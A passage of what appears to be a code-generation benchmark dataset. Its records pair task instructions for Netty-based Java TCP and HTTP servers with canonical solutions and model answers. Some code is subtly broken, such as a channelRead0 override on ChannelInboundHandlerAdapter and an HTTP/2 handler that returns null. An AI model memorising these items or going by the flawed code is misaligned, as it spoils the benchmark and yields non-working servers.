    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class WebSocketChatServer {\n\n    private int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new WebSocketChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\npublic class WebSocketChatServer {\n    private final int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator(65536));\n                            pipeline.addLast(new ChunkedWriteHandler());\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                                @Override\n                                public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                                    if (msg instanceof TextWebSocketFrame) {\n                                        TextWebSocketFrame frame = (TextWebSocketFrame) msg;\n                                        broadcast(frame.text(), ctx.channel());\n                                    }\n                                }\n                            });\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private void broadcast(String message, Channel self) {\n        for (Channel channel : self.parent().childChannels()) {\n            if (channel != self) {\n                channel.writeAndFlush(new TextWebSocketFrame(message));\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests and responses.\n\nClass Description: The NettyTcpServer class provides functionality to start and stop a Netty-based TCP server that listens for HTTP requests on a specified port and responds with a predefined message. It manages server resources and lifecycle.\n\nAttributes:\n- ctx: ApplicationContext - The Micronaut application context for dependency injection and configuration\n- serverLoop: EventLoopGroup - The Netty event loop group that handles server I/O operations\n- server: ServerSocketChannel - The server socket channel that listens for incoming connections\n\nMethods:\n- startServer(int port) -> void - Starts the TCP server on the specified port. Initializes the server with an event loop group, configures the channel pipeline with HTTP codec and handler, and binds to the given port.\n  Input: port (int) - The port number to bind the server to\n  Output: None (throws Exception if server fails to start)\n\n- stopServer() -> void - Stops the server gracefully by shutting down the event loop group and closing the application context.\n  Input: None\n  Output: None\n\n- getPort() -> int - Returns the port number the server is bound to, or -1 if the server is not running.\n  Input: None\n  Output: int - The port number or -1 if server is not active",
    "Canonical_solution": "import io.micronaut.context.ApplicationContext;\nimport io.micronaut.http.HttpRequest;\nimport io.micronaut.http.body.CloseableAvailableByteBody;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.ByteBufUtil;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.ServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport java.util.Map;\n\npublic class NettyTcpServer {\n\n    private ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n\n    public void startServer(int port) throws Exception {\n        ctx = ApplicationContext.run(Map.of(\"spec.name\", \"NettyTcpServer\"));\n        serverLoop = new NioEventLoopGroup(1);\n        server = (ServerSocketChannel) new ServerBootstrap()\n            .group(serverLoop)\n            .channel(NioServerSocketChannel.class)\n            .localAddress(port)\n            .childHandler(new ChannelInitializer<>() {\n                FullHttpResponse response;\n\n                @Override\n                public void handlerAdded(ChannelHandlerContext ctx) {\n                    ByteBuf resp = ctx.alloc().buffer();\n                    ByteBufUtil.writeAscii(resp, \"bar\");\n                    response = new DefaultFullHttpResponse(\n                        HttpVersion.HTTP_1_1, \n                        HttpResponseStatus.OK, \n                        resp, \n                        new DefaultHttpHeaders().add(HttpHeaderNames.CONTENT_LENGTH, resp.readableBytes()), \n                        EmptyHttpHeaders.INSTANCE\n                    );\n                }\n\n                @Override\n                protected void initChannel(@NonNull Channel ch) {\n                    ch.pipeline()\n                        .addLast(new HttpServerCodec())\n                        .addLast(new ChannelInboundHandlerAdapter() {\n                            boolean inBody = false;\n\n                            @Override\n                            public void channelRead(@NonNull ChannelHandlerContext ctx, @NonNull Object msg) throws Exception {\n                                if (!inBody) {\n                                    inBody = true;\n                                    if (!(msg instanceof FullHttpResponse)) {\n                                        return;\n                                    }\n                                }\n                                ((HttpContent) msg).release();\n                                if (msg instanceof LastHttpContent) {\n                                    ctx.writeAndFlush(new DefaultFullHttpResponse(\n                                        response.protocolVersion(),\n                                        response.status(),\n                                        response.content().retainedSlice(),\n                                        response.headers(),\n                                        response.trailingHeaders()\n                                    ));\n                                    inBody = false;\n                                }\n                            }\n                        });\n                }\n            })\n            .bind().syncUninterruptibly().channel();\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n    }\n\n    public int getPort() {\n        return server != null ? server.localAddress().getPort() : -1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.micronaut.context.ApplicationContext;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\n\npublic class NettyTcpServer {\n    private final ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private int port = -1;\n\n    public NettyTcpServer(ApplicationContext ctx) {\n        this.ctx = ctx;\n    }\n\n    public void startServer(int port) throws Exception {\n        this.port = port;\n        serverLoop = new NioEventLoopGroup();\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(serverLoop)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(\"decoder\", new HttpRequestDecoder());\n                        ch.pipeline().addLast(\"aggregator\", new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(\"encoder\", new HttpResponseEncoder());\n                        ch.pipeline().addLast(new SimpleHttpHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.stop();\n        }\n        port = -1;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n```"
  },
  {
    "Task_id": 193,
    "Instruction": "Task Description: Implement a Java class that sets up a Netty-based TCP server for handling HTTP requests, with thread pool management for business logic processing and idle connection handling.\n\nClass Description: EmbedServer is a Netty-based HTTP server implementation that handles incoming requests using a thread pool for business logic processing. It manages server lifecycle (start/stop) and includes connection idle state detection.\n\nAttributes:\n- executorBiz: ExecutorBiz - Business logic executor for handling requests\n- thread: Thread - Server thread running the Netty event loop\n\nMethods:\n- start(String address, int port, String appname, String accessToken) -> void - Starts the Netty server on specified port with given configuration\n  - address: String - Server bind address\n  - port: int - Server bind port\n  - appname: String - Application name (unused in current implementation)\n  - accessToken: String - Authentication token for requests\n- stop() -> void - Stops the server and releases resources\n- EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) -> void - Constructor for the HTTP request handler\n  - executorBiz: ExecutorBiz - Business logic executor\n  - accessToken: String - Authentication token\n  - bizThreadPool: ThreadPoolExecutor - Thread pool for request processing\n- channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) -> void - Handles incoming HTTP requests\n  - ctx: ChannelHandlerContext - Netty channel context\n  - msg: FullHttpRequest - Incoming HTTP request\n- exceptionCaught(ChannelHandlerContext ctx, Throwable cause) -> void - Handles channel exceptions\n  - ctx: ChannelHandlerContext - Netty channel context\n  - cause: Throwable - Exception that occurred\n- userEventTriggered(ChannelHandlerContext ctx, Object evt) -> void - Handles idle state events\n  - ctx: ChannelHandlerContext - Netty channel context\n  - evt: Object - Triggered event (IdleStateEvent for idle connections)",
    "Canonical_solution": "import com.xxl.job.core.biz.ExecutorBiz;\nimport com.xxl.job.core.biz.impl.ExecutorBizImpl;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.concurrent.*;\n\npublic class EmbedServer {\n    private static final Logger logger = LoggerFactory.getLogger(EmbedServer.class);\n\n    private ExecutorBiz executorBiz;\n    private Thread thread;\n\n    public void start(final String address, final int port, final String appname, final String accessToken) {\n        executorBiz = new ExecutorBizImpl();\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n                ThreadPoolExecutor bizThreadPool = new ThreadPoolExecutor(\n                        0,\n                        200,\n                        60L,\n                        TimeUnit.SECONDS,\n                        new LinkedBlockingQueue<Runnable>(2000),\n                        new ThreadFactory() {\n                            @Override\n                            public Thread newThread(Runnable r) {\n                                return new Thread(r, \"xxl-rpc, EmbedServer bizThreadPool-\" + r.hashCode());\n                            }\n                        },\n                        new RejectedExecutionHandler() {\n                            @Override\n                            public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {\n                                throw new RuntimeException(\"xxl-job, EmbedServer bizThreadPool is EXHAUSTED!\");\n                            }\n                        });\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))\n                                            .addLast(new HttpServerCodec())\n                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))\n                                            .addLast(new EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));\n                                }\n                            })\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(port).sync();\n                    logger.info(\">>>>>>>>>>> xxl-job remoting server start success, nettype = {}, port = {}\", EmbedServer.class, port);\n\n                    future.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-job remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-job remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    public void stop() throws Exception {\n        if (thread!=null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        logger.info(\">>>>>>>>>>> xxl-job remoting server destroy success.\");\n    }\n\n    public static class EmbedHttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        private static final Logger logger = LoggerFactory.getLogger(EmbedHttpServerHandler.class);\n\n        private ExecutorBiz executorBiz;\n        private String accessToken;\n        private ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        protected void channelRead0(final ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            bizThreadPool.execute(new Runnable() {\n                @Override\n                public void run() {\n                    String responseJson = \"{}\";\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(responseJson, CharsetUtil.UTF_8));\n                    response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/html;charset=UTF-8\");\n                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n                    ctx.writeAndFlush(response);\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            logger.error(\">>>>>>>>>>> xxl-job provider netty_http server caught exception\", cause);\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                ctx.channel().close();\n                logger.debug(\">>>>>>>>>>> xxl-job provider netty_http server close an idle channel.\");\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class EmbedHttpServer {\n    private ExecutorBiz executorBiz;\n    private Thread thread;\n\n    public void start(String address, int port, String appname, String accessToken) {\n        thread = new Thread(() -> {\n            EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n            EventLoopGroup workerGroup = new NioEventLoopGroup();\n            try {\n                ServerBootstrap b = new ServerBootstrap();\n                b.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            protected void initChannel(SocketChannel ch) {\n                                ch.pipeline().addLast(new HttpServerCodec());\n                                ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                                ch.pipeline().addLast(new IdleStateHandler(60, 0, 0, TimeUnit.SECONDS));\n                                ch.pipeline().addLast(new EmbedHttpServerHandler(executorBiz, accessToken, null));\n                            }\n                        })\n                        .option(ChannelOption.SO_BACKLOG, 128)\n                        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                ChannelFuture f = b.bind(address, port).sync();\n                f.channel().closeFuture().sync();\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                workerGroup.shutdownGracefully();\n                bossGroup.shutdownGracefully();\n            }\n        });\n        thread.start();\n    }\n\n    public void stop() {\n        if (thread != null) {\n            thread.interrupt();\n        }\n    }\n\n    public static class EmbedHttpServerHandler extends ChannelInboundHandlerAdapter {\n        private final ExecutorBiz executorBiz;\n        private final String accessToken;\n        private final ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        public void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            if (!msg.decoderResult().isSuccess()) {\n                sendError(ctx, HttpResponseStatus.BAD_REQUEST);\n                return;\n            }\n\n            if (!\"GET\".equals(msg.method())) {\n                sendError(ctx, HttpResponseStatus.METHOD_NOT_ALLOWED);\n                return;\n            }\n\n            String authHeader = msg.headers().get(HttpHeaderNames.AUTHORIZATION);\n            if (accessToken != null && !accessToken.equals(authHeader)) {\n                sendError(ctx, HttpResponseStatus.FORBIDDEN);\n                return;\n            }\n\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK,\n                    Unpooled.wrappedBuffer(\"OK\".getBytes(CharsetUtil.UTF_8)));\n            response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n            response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n            ctx.writeAndFlush(response);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                if (event.state() == IdleState.READER_IDLE) {\n                    ctx.close();\n                }\n            }\n        }\n\n        private void sendError(ChannelHandlerContext ctx, HttpResponseStatus status) {\n            FullHttpResponse response = new DefaultFullHttpResponse(\n                    HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(status.reasonPhrase().getBytes(CharsetUtil.UTF_8)));\n            response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain; charset=UTF-8\");\n            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 194,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, capable of handling incoming TCP connections with configurable port settings and proper resource management.\n\nClass Description: The Http2Server class is a Netty-based TCP server implementation that listens for HTTP/2 connections on a specified port. It manages server lifecycle including startup, shutdown, and resource cleanup, using Netty's event loop groups for efficient I/O handling.\n\nAttributes:\n- DEFAULT_PORT: int - Default port number (8080) used when no port is specified\n- bossGroup: EventLoopGroup - Netty event loop group for accepting incoming connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- bootstrap: ServerBootstrap - Netty server bootstrap for configuring server parameters\n\nMethods:\n- Http2Server() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n- shutdown() -> void - Gracefully shuts down the server and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class Http2Server {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public Http2Server() {\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new Http2ServerInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HTTP/2\u670d\u52a1\u5668\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http2.Http2FrameLogger;\nimport io.netty.handler.codec.http2.Http2MultiplexHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class Http2Server {\n    private static final int DEFAULT_PORT = 8080;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n\n    public Http2Server() {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(\n                                new Http2FrameLogger(LogLevel.DEBUG),\n                                new Http2MultiplexHandler((connection, promise) -> {\n                                    // Implement your stream handler here\n                                    return null;\n                                })\n                        );\n                    }\n                });\n    }\n\n    public void start(int port) {\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 195,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage them efficiently.\n\nClass Description: The `NettyServer` class is a TCP server implementation using Netty framework. It listens on a specified host and port, manages client connections, and provides hooks for connection events. The server uses non-blocking I/O and maintains a set of active connections.\n\nAttributes:\n- host: [String] - The host address the server binds to (can be null for any local address)\n- port: [int] - The port number the server listens on\n- connections: [Set<Connection>] - Thread-safe set of active client connections\n- onConnect: [Consumer<Connection>] - Callback function triggered when a new connection is established\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- server: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n\nMethods:\n- start(): [void] - Starts the Netty server, binds to the specified host and port, and begins accepting connections\n- channelInitializer(): [ChannelInitializer<SocketChannel>] - Creates and returns a channel initializer for new connections\n- close(): [void] - Shuts down the server gracefully, releasing all resources",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.function.Consumer;\n\nimport static io.dingodb.net.netty.Constant.SERVER;\n\n@Slf4j\n@Getter\n@Builder\npublic class NettyServer {\n\n    public final String host;\n    public final int port;\n    private final Set<Connection> connections = new CopyOnWriteArraySet<>();\n    private final Consumer<Connection> onConnect;\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(2, new ThreadPoolBuilder().name(\"Netty server \" + port).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                Connection connection = new Connection(\n                    SERVER, new Location(ch.remoteAddress().getHostName(), ch.remoteAddress().getPort()), ch\n                );\n                NettyHandlers.initChannelPipelineWithHandshake(ch, connection);\n                connections.add(connection);\n                if (onConnect != null) {\n                    onConnect.accept(connection);\n                }\n                ch.closeFuture().addListener(f -> connections.remove(connection)).addListener(f -> connection.close());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.function.Consumer;\n\npublic class NettyServer {\n    private final String host;\n    private final int port;\n    private final Set<Connection> connections = new CopyOnWriteArraySet<>();\n    private final Consumer<Connection> onConnect;\n    private final EventLoopGroup eventLoopGroup = new NioEventLoopGroup();\n    private final ServerBootstrap server = new ServerBootstrap();\n\n    public NettyServer(String host, int port, Consumer<Connection> onConnect) {\n        this.host = host;\n        this.port = port;\n        this.onConnect = onConnect;\n        configureServer();\n    }\n\n    private void configureServer() {\n        server.group(eventLoopGroup)\n              .channel(NioServerSocketChannel.class)\n              .childHandler(channelInitializer())\n              .option(ChannelOption.SO_BACKLOG, 128)\n              .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    protected ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new ConnectionHandler());\n            }\n        };\n    }\n\n    public void start() throws Exception {\n        InetSocketAddress address = new InetSocketAddress(host, port);\n        ChannelFuture future = server.bind(address).sync();\n        System.out.println(\"Server started and listening on \" + future.channel().localAddress());\n    }\n\n    public void close() throws InterruptedException {\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully().sync();\n        }\n    }\n\n    private class ConnectionHandler extends ChannelInboundHandlerAdapter {\n        private final Connection connection;\n\n        public ConnectionHandler() {\n            connection = new Connection();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            connections.add(connection);\n            onConnect.accept(connection);\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            connections.remove(connection);\n            ctx.close();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static class Connection {\n        // Placeholder for connection-specific data or methods\n    }\n}\n```"
  },
  {
    "Task_id": 196,
